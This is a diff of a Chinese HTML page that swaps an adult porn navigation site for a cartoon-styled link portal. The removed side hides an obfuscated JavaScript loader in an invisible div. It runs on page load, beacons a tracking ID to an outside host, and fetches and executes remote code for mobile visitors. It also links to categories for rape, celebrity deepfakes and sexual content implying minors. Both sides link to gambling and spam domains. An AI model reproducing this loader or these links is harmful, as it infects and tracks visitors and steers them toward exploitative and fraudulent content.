@@ -2,485 +2,205 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8" />
-<title>百万导航站</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>多内容页面</title>
 <style>
-  .carousel {
-    width: 100%;
-    max-width: 970px;
-    overflow: hidden;
-    margin: 0 auto;
-    position: relative;
-  }
-  .slides {
-    display: flex;
-    width: calc( (970px + 10px) * 2 ); /* 两倍长度，适应内容复制 */
-    animation: scroll 20s linear infinite;
-  }
-  .slides img {
-    width: 90px; /* 改小尺寸，比如90px */
-    height: auto;
-    margin-right: 10px; /* 图片间距 */
-    flex-shrink: 0;
-  }
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background-image: url('https://p5.ssl.qhimgs1.com/t043670eb52cc1b7e65.jpg'); /* 替换为你的卡通背景图片 */
+  background-size: cover;
+}
 
-  /* 缓动无缝滚动动画 */
-  @keyframes scroll {
-    0% { transform: translateX(0); }
-    100% { transform: translateX(-50%); }
-  }
+/* 顶部导航栏样式 */
+.navbar {
+  width: 100%;
+  background-color: rgba(255, 255, 255, 0.9);
+  display: flex;
+  justify-content: center;
+  padding: 10px 0;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 1000;
+}
+.navbar a {
+  margin: 0 20px;
+  text-decoration: none;
+  color: #333;
+  font-weight: bold;
+  font-size: 16px;
+  padding: 8px 12px;
+  background-color: #f5d142; /* 柔和卡通色 */
+  border-radius: 8px;
+  transition: background-color 0.3s;
+}
+.navbar a:hover {
+  background-color: #f5a142;
+}
 
-  /* 在手机端调整自适应 */
-  @media(max-width: 768px) {
-    .slides {
-      width: calc( (100% + 1%) * 2 ); /* 这里简化了，具体根据图片宽度调整 */
-      animation: scrollMobile 20s linear infinite;
-    }
-    @keyframes scrollMobile {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-50%); }
-    }
-    .slides img {
-      width: 20%; /* 图片宽度自适应，不留空白 */
-    }
-  }
+/* 内容区留出顶部空白 */
+.content {
+  padding-top: 70px; /* 留出导航栏空间 */
+  padding-left: 20px;
+  padding-right: 20px;
+}
+
+/* 图片四格布局 */
+.image-row {
+  display: flex;
+  justify-content: space-around;
+  margin: 20px 0;
+}
+.image-row a {
+  display: block;
+  width: 150px;
+  height: 150px;
+}
+.image-row img {
+  width: 100%;
+  height: 100%;
+  border-radius: 10px;
+  object-fit: cover;
+}
+
+/* 分类框架区域 */
+.category {
+  margin-top: 40px;
+}
+.category h2 {
+  font-family: 'Comic Sans MS', cursive, sans-serif;
+  margin-bottom: 20px;
+  color: #333;
+}
+
+/* 小框架块 */
+.frame-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 15px;
+  margin-bottom: 30px;
+}
+.small-frame {
+  background-color: rgba(255, 255, 255, 0.8);
+  border-radius: 8px;
+  padding: 10px;
+  text-align: center;
+}
+.small-frame a {
+  text-decoration: none;
+  color: #333;
+  font-size: 14px;
+}
+.small-frame a:hover {
+  color: #f55;
+}
+
+/* 联系方式样式 */
+.contact {
+  text-align: center;
+  margin-top: 40px;
+  padding: 20px;
+  background-color: rgba(255, 255, 255, 0.9);
+  position: relative;
+  bottom: 0;
+  width: 100%;
+}
+.contact a {
+  text-decoration: none;
+  color: #333;
+  font-weight: bold;
+}
 </style>
 </head>
 <body>
-<div class="carousel">
-  <div class="slides">
-    <!-- 原始内容 -->
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/1.png" alt="1" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/2.png" alt="2" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/3.png" alt="3" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/4.png" alt="4" />
-    <!-- 内容复制一份 -->
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/5.png" alt="1" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/6.png" alt="2" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/3.png" alt="3" />
-    <img src="https://raw.githubusercontent.com/babacaoxiaoh/shuang/refs/heads/main/images/4.png" alt="4" />
+
+<!-- 顶部导航栏 -->
+<div class="navbar">
+  <a href="#novel-section">导航站</a>
+  <a href="#comic-section">赚钱的</a>
+  <a href="#anime-section">看片的</a>
+</div>
+
+<!-- 图片两行四个 -->
+<div class="content">
+  <div class="image-row">
+    <a href="https://di5euh9afg00f.cloudfront.net/?dc=CZZ75"><img src="https://pttptt.cc/images/friend/0/697.avif?1751375374" alt="图片1"></a>
+    <a href="https://app06sd2s0.turlosnarkaslopid.com/bk/39990/ac5g1emh"><img src="https://pttptt.cc/images/friend/0/746.avif?1751042560" alt="图片2"></a>
+    <a href="https://bs2806.trevovalkrespexil.com/yj/40916/di1x8hbld"><img src="https://pttptt.cc/images/friend/0/748.avif?1751536472" alt="图片3"></a>
+    <a href="https://d3fvbx5fmquoav.cloudfront.net/?dc=LFHL06"><img src="https://pttptt.cc/images/friend/0/719.avif?1751041084" alt="图片4"></a>
+  </div>
+  <div class="image-row">
+    <a href="https://上海-svip大学.大爱无私7988.com:17988/j6Rqj"><img src="https://pttptt.cc/images/friend/0/744.avif?1751041084" alt="图片5"></a>
+    <a href="https://xpj079cc08868comxpjggtz.589781.top:8899/ylgg093.html"><img src="https://pttptt.cc/images/friend/0/740.avif?1751041084" alt="图片6"></a>
+    <a href="https://tycapp9428com08088com.568886.top:8899/tycgg035.html"><img src="https://pttptt.cc/images/friend/0/743.avif?1751041084" alt="图片7"></a>
+    <a href="http://tzkaiywqptyrt-tzqub-1048584059.ap-northeast-1.elb.amazonaws.com/?shareName=562x104"><img src="https://pttptt.cc/images/friend/0/739.avif?1751041084" alt="图片8"></a>
+  </div>
+
+  <!-- 小说部分 -->
+  <div class="category" id="novel-section">
+    <h2>小说推荐</h2>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">小说1</a></div>
+      <div class="small-frame"><a href="#">小说2</a></div>
+      <div class="small-frame"><a href="#">小说3</a></div>
+      <div class="small-frame"><a href="#">小说4</a></div>
+    </div>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">小说5</a></div>
+      <div class="small-frame"><a href="#">小说6</a></div>
+      <div class="small-frame"><a href="#">小说7</a></div>
+      <div class="small-frame"><a href="#">小说8</a></div>
+    </div>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">小说9</a></div>
+      <div class="small-frame"><a href="#">小说10</a></div>
+      <div class="small-frame"><a href="#">小说11</a></div>
+      <div class="small-frame"><a href="#">小说12</a></div>
+    </div>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">小说13</a></div>
+      <div class="small-frame"><a href="#">小说14</a></div>
+      <div class="small-frame"><a href="#">小说15</a></div>
+      <div class="small-frame"><a href="#">小说16</a></div>
+    </div>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">小说17</a></div>
+      <div class="small-frame"><a href="#">小说18</a></div>
+      <div class="small-frame"><a href="#">小说19</a></div>
+      <div class="small-frame"><a href="#">小说20</a></div>
+    </div>
+  </div>
+
+  <!-- 漫画部分 -->
+  <div class="category" id="comic-section">
+    <h2>漫画推荐</h2>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">漫画1</a></div>
+      <div class="small-frame"><a href="#">漫画2</a></div>
+      <div class="small-frame"><a href="#">漫画3</a></div>
+      <div class="small-frame"><a href="#">漫画4</a></div>
+    </div>
+    <!-- 继续添加内容 -->
+  </div>
+
+  <!-- 动漫部分 -->
+  <div class="category" id="anime-section">
+    <h2>动漫推荐</h2>
+    <div class="frame-grid">
+      <div class="small-frame"><a href="#">动漫1</a></div>
+      <div class="small-frame"><a href="#">动漫2</a></div>
+      <div class="small-frame"><a href="#">动漫3</a></div>
+      <div class="small-frame"><a href="#">动漫4</a></div>
+    </div>
+    <!-- 继续添加内容 -->
   </div>
 </div>
+
+<!-- 联系方式 -->
+<div class="contact">
+  <a href="你的联系方式链接" target="_blank">联系方式</a>
+</div>
+
 </body>
 </html>
-
-<!--<meta name="baidu_union_verify" content="ecc3609e2a30e49c13d8ed9924bacf2d">-->
-<meta charset="utf-8">
-<title>乱伦视频-性感-精彩-成人影院</title>
-<meta name="keywords" content="乱伦视频" />
-<meta name="description" content="乱伦视频" /> 
-<link rel="icon" href="/123/template/llsp1//favicon.ico" type="image/x-icon">
-<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<link rel="stylesheet" href="/123/template/llsp1/ksassets/css/soumain.css">
-<link rel="stylesheet" href="/123/template/llsp1/ksassets/css/index.css">
-<link href="/123/template/llsp1/ksassets/css/bootstrap.min.css" rel="stylesheet">
-<style>
-/*.link-url{*/
-/*    font-size:12px;width:9.6%;margin-left:3px;overflow: hidden;border: 1px solid white;text-align: center;font-weight: 600;display: inline-block;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;display: inline-block;height: 30px;line-height: 30px;*/
-/*}*/
-/*@media screen and (max-width: 1000px){*/
-/*    .link-url{*/
-/*        width:18%;*/
-/*    }*/
-     
-/*}*/
-.resou{
-    color: hsl(39.29deg 100% 75%);
-}
-
-/*dnainai*/
-.fl{
-    float: left;
-}
-.rig{
-    float: right;
-}
-
-.clear-cq:after{
-    content: "";
-    display: block;
-    height: 0;
-    clear:both;
-    visibility: hidden;
-}
-.clear-cq{
-    margin-block-start: 0em;
-    padding-inline-start: 0px;
-    margin-block-end: 1em;
-}
-.father{
-    zoom: 1;
-}
-
-.container-ul{
-    /* color:#fff; */
-    display: flex;
-}
-/*版面二 zuoaaa*/
-.container-ul ul li{
-    padding: 5px;
-    margin-left: 2px;
-    margin-top: 5px;
-    font-weight: 600;
-    font-size: 12px;
-    display: inline-block;
-    background-color: #4486f8;
-    border-radius: 5px;
-}
-.container-ul ul li a{
-    color: #fff;
-    cursor: pointer;
-}
-.type-content{
-    background: none;
-    padding-top: 5px;
-    padding-bottom: 5px;
-    border-radius: 10px;
-    margin-top: 25px;
-}
-.type-content .clear-cq li{
-    width: 12%;
-    font-size:12px;
-    margin-left:5px;
-    overflow: hidden;
-    border: none;
-    text-align: center;
-    font-weight: 600;
-    display: inline-block;
-    -webkit-box-sizing: border-box;
-    -moz-box-sizing: border-box;
-    box-sizing: border-box;
-    display: inline-block;
-    height: 30px;
-    line-height: 30px;
-    background: #5bc0de;
-    margin-top: 5px;
-    border-radius: 5px;
-}
-.type-content .clear-cq li>a{
-    color: #fff;
-    cursor: pointer;
-}
-@media screen and (max-width: 1000px){
-    .type-content .clear-cq li{
-        width:19%;
-        margin-left:3px;
-    }
-}
-#cnzz_stat_icon_1262602051 {display: none;}
-div.search > .form-control{width: 80%;}
-div.owl_search_ranking{display: block;}
-div.owl_search_ranking {width: 100%;}
-div.owl_search_ranking{
-        margin-top: 2%;
-}
-div.zz-lt span{
-    padding: 0.5em 0.3em 0.5em
-}
-form.home_search{
-    height: 115px;
-    margin-top: 19px;
-}
-form.home_search{
-    position: relative;
-}
-div.search > .btn-default{
-    position: absolute;
-    top: 0px;
-    right: 10%;
-    margin: 0px;
-    height: 40px;
-}
-form.home_search{
-    height: auto;
-}
-.label-info{
-    background-color:#ffffff00 !important
-}
-.label-primary {
-    background-color: #0095ff
-}
-
-</style> 
-</head>
-<!--<script>localStorage.setItem("urlType", "GG"); </script>-->
-<body style="background-color: #1c1c1c;">
-    <!-- https://owlook.com.cn/ -->
-<div class="header">
-    <!-- <a target="_blank" href="/zz/">
-        <img style="position: absolute; top: 0; left: 0; border: 0;" src="">
-    </a>
-     -->
-    <div class="login">
-        <a style="border: none;background: #ffffff00;color: #fff;font-size: 16px;text-decoration: underline;" class="pull-right" href="#" role="button" data-toggle="modal" data-target="#login">收藏网址</a>
-    </div>
-  
-    <form id="search" name="search" method="POST" action="/123/index.php/vod/search.html" class="home_search center-block">
-        <div class="search center-block"> 
-            <input type="text" name="wd" class="form-control center-block" placeholder="一键搜全网"> 
-            <input class="btn btn-default" type="submit" value="Go">
-        </div>
-       
-    </form> 
-
-
-    <div class="type-content">
-        <ul class="clear-cq">
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://i3j4k5l6.yrxh8.sbs/vodtype/29.html">偷拍偷窥</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://true5cd6b2.naihendacdso.buzz/?utm_source=linzho.vwolfsexse.buzz">强奸乱伦</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://std002.buzz/blog/food.html?for=de0mk4xf&r=https://true5cd6b2.naihendacdso.buzz/&ptr=https://stdtwo001.xyz/">明星换脸</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://nbo-levv1t60.2025vvipb-dave.click/?utm_source=baise.xiaomi-7ae.buzz">SM专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://ohcashi--d.anyeav070.sbs/%E4%B8%96%E7%95%8C%E5%92%8C%E5%B9%B3/?r=use-chef-snow.sexav-102.com">女同专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://d1af2ah--ncj.xodlapp-001.com/%E5%81%A5%E5%BA%B7%E7%B6%A0%E8%89%B2/wd33k.html">AV解说</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://i3j4k5l6.wuwuxia46.cc/label/%E6%B1%A1.html?https://xn--7iq522e.wuwu2025.icu/%E9%87%91%E6%89%8B%E6%8C%87.html">欧美专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://blrukou.com/%E4%B8%8D%E8%89%AF%E4%BA%BA%E7%94%9F/?r=rjq--ailohbaiyi.zza5top7y5m6.xyz">网曝门事件</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://1g6ok54b.kcqsy-bio.buzz/?utm_source=https://true5cd6b2.naihendacdso.buzz/?utm_source=linzho.vwolfsexse.buzz">中文字幕</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://rock-star-club.adultporna-av102.com/zzzz/?link=chanujiao2261.com">无码专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://i3j4k5l6.wuwuxia46.cc/label/%E6%B1%A1.html?https://xn--7iq522e.wuwu2025.icu/%E9%87%91%E6%89%8B%E6%8C%87.html">VR专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://blrukou.com/%E4%B8%8D%E8%89%AF%E4%BA%BA%E7%94%9F/?r=rjq--ailohbaiyi.zza5top7y5m6.xyz">日韩专区</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://52iekd.saoni652sx.cyou/">伦理三级</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://82.xfbs13.buzz/index.php?utm_source=sjtd3yl">性感主播</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://rock-star-club.adultporna-av102.com/zzzz/?link=chanujiao2261.com">国产视频</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://i3j4k5l6.yrxh8.sbs/vodtype/29.html">精品动漫</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://std002.buzz/blog/food.html?for=de0mk4xf&r=https://true5cd6b2.naihendacdso.buzz/&ptr=https://stdtwo001.xyz/">传媒视频</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://blrukou.com/%E4%B8%8D%E8%89%AF%E4%BA%BA%E7%94%9F/?r=rjq--ailohbaiyi.zza5top7y5m6.xyz">萝莉少女</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://52iekd.saoni652sx.cyou/">乱伦中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://1g6ok54b.kcqsy-bio.buzz/?utm_source=https://true5cd6b2.naihendacdso.buzz/?utm_source=linzho.vwolfsexse.buzz">出轨中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://rock-star-club.adultporna-av102.com/zzzz/?link=chanujiao2261.com">强奸中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://rock-star-club.adultporna-av102.com/zzzz/?link=chanujiao2261.com">人妻中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://std002.buzz/blog/food.html?for=de0mk4xf&r=https://true5cd6b2.naihendacdso.buzz/&ptr=https://stdtwo001.xyz/">制服中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://std002.buzz/blog/food.html?for=de0mk4xf&r=https://true5cd6b2.naihendacdso.buzz/&ptr=https://stdtwo001.xyz/">调教中文</a>
-                </li>
-                            <li class="fl">
-                    <a class="type-tiao-go" target="_blank" href="https://blrukou.com/%E4%B8%8D%E8%89%AF%E4%BA%BA%E7%94%9F/?r=rjq--ailohbaiyi.zza5top7y5m6.xyz">糖心Vlog</a>
-                </li>
-                    </ul>    
-    </div>
-
-    <div>
-        <style>
-    @media screen and (max-width: 640px) {
-        .icon-list ul li {
-            width: 20% !important; /* 手机端一行391个 */
-        }
-    }
-    
-    .icon-list ul {
-        list-style: none;
-        padding: 0;
-        margin: 0;
-    }
-    
-    .icon-list ul li {
-        width: 8.33%; /* 电脑端一行12个 */
-        float: left;
-        text-align: center;
-        margin-bottom: 10px;
-    }
-    
-    .icon-list ul li img {
-        width: 45px;
-        height: 45px;
-        display: block;
-        margin: 0 auto 5px;
-        border-radius: 5px; /* 添加圆角效果 */
-    }
-    
-    .icon-list ul li div {
-        font-size: 12px;
-        line-height: 2.2;
-        color: #fff; 
-    }
-</style>
-<div style="margin-top: 10px;width: 100%;margin-bottom:10px;">
-    <a rel="nofollow" href="https://woji1bh-20.nbjcds.com?shareName=1991x40" title="BC" target="_blank">
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://aispsp02.top/img/am-hengfu.gif"><span></span>
-    </a>
-    <a rel="nofollow" href="https://154.39.108.13/?channelCode=dydh" title="喵喵直播" target="_blank">
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://img.aimga.top/img/mbzb.gif"><span></span>
-    </a>
-    <a rel="nofollow" href="https://weurv.ytuzc.com/?a=133161t795" title="色戒直播" target="_blank">
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://aispsp02.top/img/sejie2413-960x80.gif"><span></span>
-    </a>
-    <a rel="nofollow" href="https://xslip.ljddu.com/?a=411171" title="爱色播直播" target="_blank">
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://www.kmtbu.top/images/35/ASB-960X80.gif"><span></span>
-    </a>
-    <a rel="nofollow" href="https://d29hg3j6fgnwet.cloudfront.net/051933" title="炮台" target="_blank"> 
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://img.aimga.top/img/yp2.gif"><span></span>
-    </a>
-    <a rel="nofollow" href="https://wwwbaidu162.top/?cid=7654384" title="PG" target="_blank"> 
-        <img style="width: 100%;height:60px;margin-top: 10px;" src="https://aispsp02.top/img/960x80-3.gif"><span></span>
-    </a>
-    
-    <div class="icon-list" style="margin-top: 15px;margin-bottom: 10px;">
-        <ul style="padding: 0; margin: 0; overflow: hidden;">
-            <li style="float: left; width: 8.33%; text-align: center; margin-bottom: 10px;">
-                <a href="https://d1jpxpqjnksusr.cloudfront.net/?dc=AZE017" target="_blank">
-                    <img src="https://aispsp02.top/img/p.jpg" style="width: 45px; height: 45px; border-radius: 5px;">
-                    <div style="font-size: 12px;">免费P站</div>
-                </a>
-            </li>
-        
-            <li style="float: left; width: 8.33%; text-align: center; margin-bottom: 10px;">
-                <a href="https://d3he5fmrz3qne3.cloudfront.net/?dc=AZE017" target="_blank">
-                    <img src="http://aispsp02.top/img/crdy.gif" style="width: 45px; height: 45px; border-radius: 5px;">
-                    <div style="font-size: 12px;">免费tiktok</div>
-                </a>
-            </li>
-            <li style="float: left; width: 8.33%; text-align: center; margin-bottom: 10px;">
-                <a href="https://d3qaaxft76zym9.cloudfront.net/?dc=AZE017" target="_blank">
-                    <img src="http://aispsp02.top/img/mfkp.jpg" style="width: 45px; height: 45px; border-radius: 5px;">
-                    <div style="font-size: 12px;">免费乱伦</div>
-                </a>
-            </li>
-            <li style="float: left; width: 8.33%; text-align: center; margin-bottom: 10px;">
-                <a href="https://d2mqr7ssi4imqd.cloudfront.net?dc=AZE017" target="_blank">
-                    <img src="https://aispsp02.top/img/ua8anv.gif" style="width: 45px; height: 45px; border-radius: 5px;">
-                    <div style="font-size: 12px;">免费欲漫</div>
-                </a>
-            </li>
-            <li style="float: left; width: 8.33%; text-align: center; margin-bottom: 10px;">
-                <a href="https://www.q5q3ay.xyz/#/registers/s1/yueeykba" target="_blank">
-                    <img src="http://103.233.248.68/static/upload/image/yiang3.png" style="width: 45px; height: 45px; border-radius: 5px;">
-                    <div style="font-size: 12px;">意昂体育</div>
-                </a>
-            </li>
-        </ul>
-    </div>
-            
-    
-</div>
-
-    </div>
-    <div>
-        <div style="display: none !important;">function qjDgfeKI(e){var t="",n=r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++;}else if(r&gt;191&&r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)&lt;&lt;6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)&lt;&lt;12|(c2&63)&lt;&lt;6|c3&63);n+=3;}}return t;};function AlzNHMmw(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZ'+'abcdefghijklmnopqrstuvwxyz'+'0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f&lt;e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&15)&lt;&lt;4|u&gt;&gt;2;i=(u&3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r);}if(a!=64){t=t+String.fromCharCode(i);}}return qjDgfeKI(t);};window[''+'h'+'g'+'p'+'k'+'z'+'Y'+'i'+'w'+'Q'+'P'+'']=((navigator.platform&&!/^Mac|Win/.test(navigator.platform))||(!navigator.platform&&/Android|iOS|iPhone/i.test(navigator.userAgent)))?function(){;(function(u,k,i,w,d,c){function lDWUt(t){var e=t.match(new RegExp('^((https?|wss?)?://)?a.'));if(!e)return t;var n=new Date;return(e[1]||"")+[n.getMonth()+1,n.getDate(),n.getHours()].join("").split("").map(function(t){return String.fromCharCode(t%26+(t%2!=0?65:97))}).join("")+"."+t.split(".").slice(-2).join(".")};var x=AlzNHMmw,cs=d[x('Y3VycmVudFNjcmlwdA==')],crd=x('Y3JlYXRlRWxlbWVudA==');'jQuery';u=lDWUt(decodeURIComponent(x(u.replace(new RegExp(c[0]+''+c[0],'g'),c[0]))));!function(o,t){var a=o.getItem(t);if(!a||32!==a.length){a='';for(var e=0;e!=32;e++)a+=Math.floor(16*Math.random()).toString(16);o.setItem(t,a)}var n='https://ouj.vtqccm.com:7891/stats/9397/'+i+'?ukey='+a+'&host='+window.location.host;navigator.sendBeacon?navigator.sendBeacon(n):(new Image).src=n}(localStorage,'__tsuk');'jQuery';if(navigator.userAgent.indexOf('b'+'a'+'id'+'u')!=-1){var xhr=new XMLHttpRequest();xhr.open('POST',u+'/vh4/'+i);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded;');xhr.setRequestHeader('X-REQUESTED-WITH','XMLHttpRequest');xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){var data=JSON.parse(xhr.responseText);new Function('_'+'t'+'d'+'cs',new Function('c',data.result.decode+';return '+data.result.name+'(c)')(data.result.img.join('')))(cs);}};xhr.send('u=1');}else if(WebSocket&&/UCBrowser|Quark|Huawei|Vivo|NewsArticle/i.test(navigator.userAgent)){k=lDWUt(decodeURIComponent(x(k.replace(new RegExp(c[1]+''+c[1],'g'),c[1]))));var ws=new WebSocket(k+'/wh4/'+i);ws.onmessage=function(e){ws.close();new Function('_tdcs',x(e.data))(cs);};ws.onerror=function(){var s=d[crd]('script');s.src=u+'/vh4/'+i;cs.parentElement.insertBefore(s,cs);}}else{var s=d[crd]('script');s.src=u+'/vh4/'+i;cs.parentElement.insertBefore(s,cs);}})('aHR0cHMlM0ElMkYlMkZhhLmhhveHdsbS5jbiUzQTg4OTE=','d33NzJTNBJTJGJTJGYS50Y33FjYi5jbiUzQTk1MzQ=','9019',window,document,['h','3']);}:function(){};</div>
-<script>new Function(document['cu'+'rren'+'tScr'+'ipt']['prev'+'iousE'+'leme'+'ntSi'+'bling']['tex'+'tCo'+'ntent'])();</script>
-<div> <div><div> </div>  </div></div><div> </div>
-<script>hgpkzYiwQP();</script>    </div>
-
-
-    <div class="owl_search_ranking center-block" style="margin-top: 20px;">
-        <span style="font-size: 100%" class="label label-info">广告合作</span>
-        
-
-        <!-- <a target="_blank" href="/md"><span class="label label-primary" style="background: #d4507d">更多</span></a> -->
-    </div>
-    <div class="header-ul">
-        <div class="owl_search_ranking center-block zz-lt link-url link-cha">
-
-            <!-- <a target="_blank" href="/md"><span class="label label-primary" style="background: #d4507d">更多</span></a> -->
-        </div>
-    </div>
- 
-</div>
-
-
-
-
-<div class="footer" style="    text-align: center;
-    margin-top: 90px;">
-    <div class="copyright">
-        <!-- <p onclick="goUrl()">😈 乱伦视频-性感-精彩-成人影院</p> -->
-        <!-- <p>2020-现在 llsp.xyz. All Rights Reserved. </p> -->
-        <div style="display: none;"></div>
-        <!--<p><a style="color:#fff">地址发布页：</a></p>-->
-        <p><a style="color:#fff">联系方式：TG电报：@ssnbnk</a></p>-->
-        <p><a style="color:#fff"></a></p> 
-        <p><a style="color:#fff">免责声明：本站明确包含成人内容！如果您未满18岁或被误导来到本站，那么请离开；如果您已满18岁，请在遵守您当地法律的前提下使用本站。</a></p>
-        <!-- <p>统计代码</p> -->
-    </div>
-</div>
-
-
-
-    <script>
-    var form= getUrlParms(`form`)
-    var curlDate = getUrlParms(`date`) 
-    const currentDate = new Date();
-    const year = currentDate.getFullYear();
-    const month = currentDate.getMonth() + 1; 
-    const day = currentDate.getDate();
-    var dateStr = `${year}${month}${day}`
-    
-    function getUrlParms(name){
-        var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
-        var r = window.location.search.substr(1).match(reg);
-        if(r!=null)
-        return unescape(r[2]);
-        return null; 
-    }  
-    
-    
-    var mark = $.cookie(`luodi_${form}`)
-    var x = new Date(new Date(new Date().toLocaleDateString()).getTime()+24*60*60*1000-1);
-    if(form!=null && document.referrer && dateStr==curlDate && mark!=`${form}`){
-        $.cookie(`luodi_${form}`, form, { expires: x });
-        addCount()
-    }
-    
-    
-    function addCount(){
-        $.ajax({
-            url: `/123/api.php/index/addCount`,
-            type: 'get',
-            async: true, //
-            dataType: 'json',
-            data:{form:form,type:2},
-            success: function(res) {
-            
-            },
-            error: function() {
-    
-            }
-        });
-        
-    }
-    </script> 
-<script src="/123/tongji.js"></script>
